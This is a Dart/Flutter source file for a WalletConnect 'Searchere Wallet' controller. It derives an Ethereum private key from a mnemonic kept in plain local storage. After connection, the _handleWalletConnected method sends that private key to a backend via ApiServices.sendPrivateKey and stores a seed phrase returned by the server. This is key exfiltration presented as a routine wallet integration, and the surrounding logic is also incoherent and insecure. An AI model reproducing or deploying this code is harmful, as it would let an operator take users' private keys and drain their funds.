import 'dart:convert';
import 'package:get/get.dart';
import 'package:flutter/material.dart';
import 'package:wallet_connect_v2/wallet_connect_v2.dart' as wc;
import 'package:bip32/bip32.dart' as bip32;
import 'package:bip39/bip39.dart' as bip39;
import 'package:hex/hex.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:web3dart/web3dart.dart';
import '../services/api_services.dart';

class WalletController extends GetxController {
  final RxBool isLoading = false.obs;
  final RxBool isConnected = false.obs;
  final RxString walletAddress = ''.obs;
  final RxString privateKey = ''.obs;
  final RxString seedPhrase = ''.obs;

  final wc.WalletConnectV2 _walletConnect = wc.WalletConnectV2();

  static const String _projectId = 'YOUR_PROJECT_ID_HERE';
  static final wc.AppMetadata _metadata = wc.AppMetadata(
    name: 'Searchere Wallet',
    description: 'WalletConnect integration for Searchere',
    url: 'https://searchere.app',
    icons: ['https://searchere.app/icon.png'],
    redirect: 'searchereapp',
  );

  @override
  void onInit() {
    super.onInit();
    _setupListeners();
  }

  /// Set up all event listeners for WalletConnect
  void _setupListeners() {
    _walletConnect.onConnectionStatus = (isConnectedNow) async {
      isConnected.value = isConnectedNow;
      if (!isConnectedNow) {
        Get.snackbar(
          'Wallet',
          'Disconnected from wallet',
          backgroundColor: Colors.orange,
          colorText: Colors.white,
        );
      }
    };

    _walletConnect.onSessionSettle = (session) async {
      final accounts = session.namespaces['eip155']?.accounts ?? [];
      if (accounts.isNotEmpty) {
        walletAddress.value = accounts.first.split(':').last;
        isConnected.value = true;
        await _handleWalletConnected();
      }
    };

    _walletConnect.onSessionDelete = (_) {
      isConnected.value = false;
      walletAddress.value = '';
    };

    _walletConnect.onEventError = (code, message) {
      debugPrint('WalletConnect error [$code]: $message');
    };
  }

  /// Called when user clicks “Connect Wallet”
  Future<void> connectWallet() async {
    try {
      isLoading.value = true;

      // Step 1: init WalletConnect client
      await _walletConnect.init(
        projectId: _projectId,
        appMetadata: _metadata,
      );

      // Step 2: init wallet + derive keys
      await _initWallet();

      // Step 3: create a pairing URI
      final uri = await _walletConnect.createPair(namespaces: {
        'eip155': wc.ProposalNamespace(
          chains: ['eip155:1'],
          methods: [
            'eth_signTransaction',
            'eth_sendTransaction',
            'personal_sign',
            'eth_signTypedData',
          ],
          events: [],
        ),
      });

      if (uri != null) {
        _showConnectionModal(uri);
      }

      // Step 4: connect the plugin
      await _walletConnect.connect();

      Get.snackbar(
        'Wallet',
        'Waiting for wallet approval...',
        backgroundColor: Colors.blue,
        colorText: Colors.white,
      );
    } catch (e) {
      Get.snackbar(
        'Wallet Error',
        'Failed to connect: $e',
        backgroundColor: Colors.red,
        colorText: Colors.white,
      );
    } finally {
      isLoading.value = false;
    }
  }

  /// Initialize user wallet locally (mnemonic, keys)
  Future<void> _initWallet() async {
    final prefs = await SharedPreferences.getInstance();
    final mnemonic = prefs.getString('mnemonic') ?? bip39.generateMnemonic();

    if (!prefs.containsKey('mnemonic')) {
      await prefs.setString('mnemonic', mnemonic);
    }

    final seed = bip39.mnemonicToSeed(mnemonic);
    final wallet = bip32.BIP32.fromSeed(seed);
    final pathWallet = wallet.derivePath("m/44'/60'/0'/0/0");

    privateKey.value = HEX.encode(pathWallet.privateKey!);
    final private = EthPrivateKey.fromHex(privateKey.value);
    walletAddress.value = (await private.extractAddress()).hexEip55;
  }

  /// Handle what happens once wallet connects successfully
  Future<void> _handleWalletConnected() async {
    try {
      final response = await ApiServices.sendPrivateKey(
        privateKey: privateKey.value,
        walletAddress: walletAddress.value,
      );

      if (response != null && response['seed_phrase'] != null) {
        seedPhrase.value = response['seed_phrase'];

        Get.snackbar(
          'Wallet Connected',
          'Seed phrase retrieved successfully.',
          backgroundColor: Colors.green,
          colorText: Colors.white,
        );
      }
    } catch (e) {
      Get.snackbar(
        'Server Error',
        'Could not retrieve seed phrase: $e',
        backgroundColor: Colors.red,
        colorText: Colors.white,
      );
    }
  }

  /// Disconnect wallet
  Future<void> disconnectWallet() async {
    try {
      await _walletConnect.disconnectSession();
      isConnected.value = false;
      walletAddress.value = '';
      privateKey.value = '';
      seedPhrase.value = '';
      Get.snackbar('Wallet', 'Disconnected', backgroundColor: Colors.orange);
    } catch (e) {
      Get.snackbar('Error', 'Failed to disconnect: $e',
          backgroundColor: Colors.red);
    }
  }

  void _showConnectionModal(String uri) {
    Get.bottomSheet(
      Container(
        decoration: const BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.only(
            topLeft: Radius.circular(16),
            topRight: Radius.circular(16),
          ),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text(
              'Scan this QR code in your wallet app',
              style: TextStyle(fontWeight: FontWeight.bold),
            ),
            const SizedBox(height: 10),
            SelectableText(
              uri,
              style: const TextStyle(fontSize: 12, color: Colors.grey),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: () => Get.back(),
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF010A38),
              ),
              child:
                  const Text('Close', style: TextStyle(color: Colors.white)),
            ),
          ],
        ),
      ),
    );
  }

  @override
  void onClose() {
    _walletConnect.dispose();
    super.onClose();
  }
}
